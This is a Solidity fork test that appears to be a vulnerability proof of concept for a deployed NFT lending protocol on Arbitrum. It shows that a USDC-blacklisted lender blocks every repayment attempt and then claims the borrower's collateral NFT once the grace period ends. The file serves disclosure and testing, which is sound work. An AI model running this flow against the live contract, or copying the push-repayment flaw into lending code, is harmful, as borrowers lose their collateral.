// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";

/// @notice Fork PoC: the same push-repayment flaw in NFTLoanProtocol. A USDC-blacklisted
///         lender blocks repayLoan(), and the borrower's collateral NFT goes to the lender.
/// Run:   ARB_RPC_URL=https://arb1.arbitrum.io/rpc forge test --mc GavelNFTBlacklistRepayDoS -vv
///
/// Target: Gavel NFTLoanProtocol (Arbitrum One), deployed v1, Sourcify exact match to repo 457fea8.
/// It has no loans on mainnet yet (loanNonce == 0), so the test creates one through the public
/// auction flow. Collateral is permissionless (any ERC-721), so a minimal test NFT stands in.

interface INFTLoanProtocol {
    struct Loan {
        address borrower;
        address collateralNFT;
        uint256 collateralTokenId;
        address loanToken;
        uint256 loanAmount;
        uint256 repaymentAmount;
        uint256 maturityTimestamp;
        address lender;
        uint8 status; // 0 ACTIVE, 1 REPAID, 2 DEFAULTED
        uint256 pauseSnapshot;
    }

    function createAuction(
        address collateralNFT,
        uint256 collateralTokenId,
        address loanToken,
        uint256 loanAmount,
        uint256 maxRepayment,
        uint256 loanDuration,
        uint256 auctionDuration,
        uint256 bidStep
    ) external returns (uint256 auctionId);
    function placeBid(uint256 auctionId, uint256 repaymentAmount) external;
    function finalizeAuction(uint256 auctionId) external;
    function getLoan(uint256 loanId) external view returns (Loan memory);
    function repayLoan(uint256 loanId) external;
    function claimCollateral(uint256 loanId) external;
    function positionNFT() external view returns (address);
    function loanNonce() external view returns (uint256);
    function totalPausedDuration() external view returns (uint256);
    function GRACE_PERIOD() external view returns (uint256);
}

interface IPositionNFT {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getBorrowerTokenId(uint256 loanId) external pure returns (uint256);
    function getLenderTokenId(uint256 loanId) external pure returns (uint256);
}

interface IFiatToken {
    function blacklister() external view returns (address);
    function blacklist(address account) external;
    function isBlacklisted(address account) external view returns (bool);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IERC721Receiver {
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4);
}

/// Minimal ERC-721 with a receiver check on safeTransferFrom, standing in for any collateral NFT.
contract TestNFT {
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => address) public getApproved;
    mapping(address => mapping(address => bool)) public isApprovedForAll;

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }

    function approve(address spender, uint256 id) external {
        require(msg.sender == ownerOf[id], "not owner");
        getApproved[id] = spender;
    }

    function setApprovalForAll(address op, bool ok) external {
        isApprovedForAll[msg.sender][op] = ok;
    }

    function transferFrom(address from, address to, uint256 id) public {
        require(ownerOf[id] == from, "wrong from");
        require(
            msg.sender == from || msg.sender == getApproved[id] || isApprovedForAll[from][msg.sender], "not allowed"
        );
        delete getApproved[id];
        ownerOf[id] = to;
    }

    function safeTransferFrom(address from, address to, uint256 id) external {
        safeTransferFrom(from, to, id, "");
    }

    function safeTransferFrom(address from, address to, uint256 id, bytes memory data) public {
        transferFrom(from, to, id);
        if (to.code.length > 0) {
            require(
                IERC721Receiver(to).onERC721Received(msg.sender, from, id, data)
                    == IERC721Receiver.onERC721Received.selector,
                "unsafe recipient"
            );
        }
    }

    function supportsInterface(bytes4 id) external pure returns (bool) {
        return id == 0x80ac58cd || id == 0x01ffc9a7;
    }
}

contract GavelNFTBlacklistRepayDoS is Test {
    INFTLoanProtocol constant PROTOCOL = INFTLoanProtocol(0x506e414c7D39639B2E9E318C46eD378AD51147eb);
    IFiatToken constant USDC = IFiatToken(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    uint256 constant FORK_BLOCK = 512620498;

    uint256 constant LOAN_AMOUNT = 1_000e6; // 1,000 USDC principal
    uint256 constant MAX_REPAYMENT = 1_100e6; // borrower's cap
    uint256 constant BID = 1_050e6; // lender's winning bid (5% interest)
    uint256 constant NFT_ID = 7;

    IPositionNFT nft;
    TestNFT collateral;
    address borrower = makeAddr("borrower");
    address lender = makeAddr("lender");
    uint256 loanId;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("arbitrum"), FORK_BLOCK);
        nft = IPositionNFT(PROTOCOL.positionNFT());
        assertEq(PROTOCOL.loanNonce(), 0, "expected no mainnet loans at this block");

        collateral = new TestNFT();
        collateral.mint(borrower, NFT_ID);

        // 1. Borrower lists the NFT: 1,000 USDC for 7 days, auction open 1 day.
        vm.startPrank(borrower);
        collateral.approve(address(PROTOCOL), NFT_ID);
        loanId = PROTOCOL.createAuction(
            address(collateral), NFT_ID, address(USDC), LOAN_AMOUNT, MAX_REPAYMENT, 7 days, 1 days, 0
        );
        vm.stopPrank();

        // 2. Lender wins with a 1,050 USDC repayment bid.
        deal(address(USDC), lender, LOAN_AMOUNT);
        vm.startPrank(lender);
        USDC.approve(address(PROTOCOL), LOAN_AMOUNT);
        PROTOCOL.placeBid(loanId, BID);
        vm.stopPrank();

        // 3. The auction ends and anyone finalizes it. The borrower receives the principal.
        vm.warp(block.timestamp + 1 days);
        PROTOCOL.finalizeAuction(loanId);

        INFTLoanProtocol.Loan memory l = PROTOCOL.getLoan(loanId);
        assertEq(l.status, 0, "loan not ACTIVE");
        assertEq(l.repaymentAmount, BID);
        assertEq(USDC.balanceOf(borrower), LOAN_AMOUNT, "borrower not paid principal");
        assertEq(collateral.ownerOf(NFT_ID), address(PROTOCOL), "NFT not escrowed");
        assertEq(nft.ownerOf(nft.getLenderTokenId(loanId)), lender);
    }

    function _deadline(INFTLoanProtocol.Loan memory l) internal view returns (uint256) {
        return l.maturityTimestamp + PROTOCOL.GRACE_PERIOD() + (PROTOCOL.totalPausedDuration() - l.pauseSnapshot);
    }

    function _fundAndApproveRepayment() internal {
        deal(address(USDC), borrower, BID);
        vm.prank(borrower);
        USDC.approve(address(PROTOCOL), BID);
    }

    /// Control: with no blacklist, the borrower repays and gets the NFT back.
    function test_control_repaySucceeds() public {
        _fundAndApproveRepayment();
        vm.prank(borrower);
        PROTOCOL.repayLoan(loanId);

        assertEq(PROTOCOL.getLoan(loanId).status, 1, "not REPAID");
        assertEq(collateral.ownerOf(NFT_ID), borrower, "NFT not returned");
        assertEq(USDC.balanceOf(lender), BID, "lender not paid");
    }

    /// The bug: a blacklisted lender blocks repayment, then claims the NFT.
    function test_blacklistedLender_forcesDefault_nftLoan() public {
        INFTLoanProtocol.Loan memory l = PROTOCOL.getLoan(loanId);

        // Circle blacklists the lender-position holder.
        vm.prank(USDC.blacklister());
        USDC.blacklist(lender);
        assertTrue(USDC.isBlacklisted(lender));

        // The borrower is funded and has approved, but cannot repay before maturity...
        _fundAndApproveRepayment();
        vm.prank(borrower);
        vm.expectRevert(bytes("Blacklistable: account is blacklisted"));
        PROTOCOL.repayLoan(loanId);

        // ...or on the last second of the grace period.
        vm.warp(_deadline(l) - 1);
        vm.prank(borrower);
        vm.expectRevert(bytes("Blacklistable: account is blacklisted"));
        PROTOCOL.repayLoan(loanId);

        // The grace period ends. claimCollateral never touches USDC, so the blacklisted lender takes the NFT.
        vm.warp(_deadline(l));
        vm.prank(lender);
        PROTOCOL.claimCollateral(loanId);

        assertEq(PROTOCOL.getLoan(loanId).status, 2, "not DEFAULTED");
        assertEq(collateral.ownerOf(NFT_ID), lender, "lender did not get NFT");
        assertEq(USDC.balanceOf(borrower), BID, "borrower still holds the repayment USDC");

        console2.log("loanId                ", loanId);
        console2.log("repayment blocked (6dp)", BID);
        console2.log("NFT seized by lender  ", NFT_ID);
    }
}
